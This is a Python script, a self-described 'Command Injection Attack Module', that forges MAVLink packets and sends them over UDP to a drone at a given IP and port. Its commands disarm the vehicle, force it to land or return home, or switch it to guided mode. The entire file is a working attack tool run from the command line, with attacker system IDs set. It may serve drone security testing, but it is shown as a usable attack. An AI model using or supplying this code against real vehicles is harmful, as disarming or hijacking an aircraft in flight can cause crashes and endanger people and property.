#!/usr/bin/env python3
"""
Command Injection Attack Module

Sends dangerous commands (RTL, DISARM, LAND, etc.)
"""
import time
import sys
import socket
from pymavlink import mavutil
from pymavlink.dialects.v20 import common as mavlink2

def attack_command_injection(sock, mav, target_ip, target_port, command_type: str = "RTL"):
    """
    Send dangerous command
    
    Args:
        sock: UDP socket
        mav: MAVLink packer
        target_ip: Target IP address
        target_port: Target port
        command_type: RTL, DISARM, LAND, MODE_GUIDED
    """
    print(f"[COMMAND INJECT] Sending {command_type} command...")
    
    try:
        if command_type == "RTL":
            msg = mav.command_long_encode(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
                confirmation=0,
                param1=0, param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            print(f"[ATTACKER] Sent COMMAND_LONG (RTL) to {target_ip}:{target_port} ({len(packet)} bytes)")
            
        elif command_type == "DISARM":
            print("[COMMAND INJECT] ⚠️  WARNING: DISARM is DANGEROUS!")
            msg = mav.command_long_encode(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
                confirmation=0,
                param1=0,  # 0 = disarm
                param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            print(f"[ATTACKER] Sent COMMAND_LONG (DISARM) to {target_ip}:{target_port} ({len(packet)} bytes)")
            
        elif command_type == "LAND":
            msg = mav.command_long_encode(
                target_system=1,
                target_component=1,
                command=mavutil.mavlink.MAV_CMD_NAV_LAND,
                confirmation=0,
                param1=0, param2=0, param3=0, param4=0,
                param5=0, param6=0, param7=0
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            print(f"[ATTACKER] Sent COMMAND_LONG (LAND) to {target_ip}:{target_port} ({len(packet)} bytes)")
            
        elif command_type == "MODE_GUIDED":
            msg = mav.set_mode_encode(
                target_system=1,
                base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                custom_mode=4  # GUIDED mode
            )
            packet = msg.pack(mav)
            sock.sendto(packet, (target_ip, target_port))
            print(f"[ATTACKER] Sent SET_MODE to {target_ip}:{target_port} ({len(packet)} bytes)")
        
        print(f"[COMMAND INJECT] {command_type} command sent!")
        
    except Exception as e:
        print(f"[COMMAND INJECT] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python command_injection.py <target_ip> <target_port> [command_type]")
        print("Commands: RTL, DISARM, LAND, MODE_GUIDED")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    command_type = sys.argv[3] if len(sys.argv) > 3 else "RTL"
    
    # Create raw UDP socket (reliable on Windows)
    print(f"[ATTACKER] Creating UDP socket for: {target_ip}:{target_port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Create MAVLink packer (NO network binding - pure encoder)
    mav = mavlink2.MAVLink(None)
    mav.srcSystem = 255  # Attacker system ID
    mav.srcComponent = 190  # Attacker component ID
    
    time.sleep(1)
    attack_command_injection(sock, mav, target_ip, target_port, command_type)
